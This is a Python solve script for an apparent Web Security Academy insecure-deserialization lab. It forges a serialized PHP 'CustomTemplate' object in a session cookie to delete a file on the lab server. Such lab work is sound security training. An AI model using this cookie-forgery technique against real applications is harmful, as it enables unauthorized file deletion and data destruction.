#!/usr/bin/python3.7
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup
import base64
from urllib.parse import quote

url = 'https://0ac100c20301582f81ce454e00f300f8.web-security-academy.net'

session = requests.Session()

# Đăng nhập 
data_login = {
    'username': 'wiener',
    'password': 'peter',
}


response = requests.post(
    url + "/login",
    data = data_login,
)

# lấy data từ cookie và xử lí
data_cookies = 'O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}'
encode_base64 = base64.b64encode(data_cookies.encode('utf-8')).decode('utf-8')
encode_url = quote(encode_base64)
solve = encode_url

cookies = {
    'session': solve,
}

# dùng cookie đã sử lý để xóa carlos
response = requests.get(
    url + '/product?productId=1',
    cookies=cookies,   
    verify=False,
)

# print(response.text) # hiển thị response có flag
soup = BeautifulSoup(response.text, 'html.parser')
print(soup)